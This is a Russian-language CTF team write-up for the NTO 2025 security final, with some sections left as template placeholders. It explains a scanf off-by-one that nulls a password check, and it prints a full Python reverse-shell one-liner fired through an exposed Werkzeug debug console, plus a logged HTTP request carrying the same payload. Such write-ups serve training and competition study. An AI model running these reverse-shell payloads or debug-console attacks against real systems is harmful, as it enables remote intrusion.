# Райтап на финал иб нто 2025 от команды While_hot_false
## Состав
* Walter White
* eogod
* Kolya080808
* kvasilek
# Задачи с коротким ответом

## Web
## Pwn 1
Из функции write_file() : 
```
  printf("Enter file content: ");
  __isoc99_scanf("%256s", file_buffer);
  flush();
  file = open(path, 65, 0, v0, v1, v2);
```
При этом file buffer сам размером 256 байт, а после него лежит secret password:
```
.bss:0000000000004120 file_buffer     db 100h dup(?)          ; DATA XREF: init_storage+70↑o
.bss:0000000000004120                                         ; init_storage+A8↑o ...
.bss:0000000000004220                 public secret_password
.bss:0000000000004220 ; char secret_password[32]
.bss:0000000000004220 secret_password db 20h dup(?)   
```
scanf("%256s", file_buffer) записывает максимум 256 байт + 1 ноль байт, который попадёт уже в secret_pasword. В итоге пароль начинается с 0x00, то есть по факту пустая строка. \
Решение: 
* Записываем в файл 256 букв 
* Запрашиваем чтение 00000000 и при запросе пароля просто нажимаем enter 
* Получаем флаг
```
nc 10.10.11.101 9001
                    
            +++++++                )                           
          +++      ++           ( /(   (     )           (     
   ++++++++         ++++        )\()) ))   (     `  )   )\ )  
  ++                   +++     (_))/ /((_)  )\  ' /(/(  (()/(  
 ++          ++          ++    | |_ (_))  _((_)) ((_)_\  )(_)) 
 ++        ++++++.       ++    |  _|/ -_)| '  \()| '_ \)| || | 
  +++        ++        +++      \__|\___||_|_|_| | .__/  \_, | 
    :+++++++ ++  +++++++                         |_|     |__/  
             ++                                  
             ++                                  
    finally, service for reading and             
                writng your OWN temporary files! 


Commands:
        1. Read file
        2. Write file
>> 2
Enter file content: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Your file ID: 0a09d600

Commands:
        1. Read file
        2. Write file
>> 1
Enter file ID: 00000000
Opa, give me password: 
File contains: nto{sup3r_s3cr3t_c0nf1d3ntial_fl4g}
Commands:
        1. Read file
        2. Write file
>> 

```
### Касса
перенос строк через \ кстати делается \
перенос строк через \ кстати делается
## Infra

### Confluence
всем респект
### NAS
да таск халява
### NAS2
коля респект
### Сервер печати

# Задачи с защитой
## Горшочек
текст решения \
перенос строк через \ кстати делается

## Враг врага 2 - 1
через /console, который доступен, потому что на питоновском веб сервере включен debug, был прокинут реверс шелл на питоне:
```
>>> import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.10.12&#34;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;bash&#34;)
```
## Враг врага 2 - 2
Ответ: 10.10.10.12, 81.177.221.242
* 10.10.10.12 - посылал запрос на /console с реверс шеллом на 172.18.0.3
```
GET /console?&__debugger__=yes&cmd=import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%2210.10.10.12%22%2C9001))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bimport%20pty%3B%20pty.spawn(%22bash%22)&frm=0&s=yqqPfQiFZmXsmnZQYMPF HTTP/1.1
Host: 10.10.10.3:5000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.3:5000/console
Connection: keep-alive
Cookie: hide-dotfile=no; __wzd44828fdba9134e8d1a6f=1737574404|9130fd746c6b
Priority: u=0
```
* 81.177.221.242 - c этого айпишника был скачан бинарник, лежащий на /app

## Markdown 
[Как пользоваться](https://github.com/adam-p/markdown-here/wiki/markdown-cheatsheet#lists)
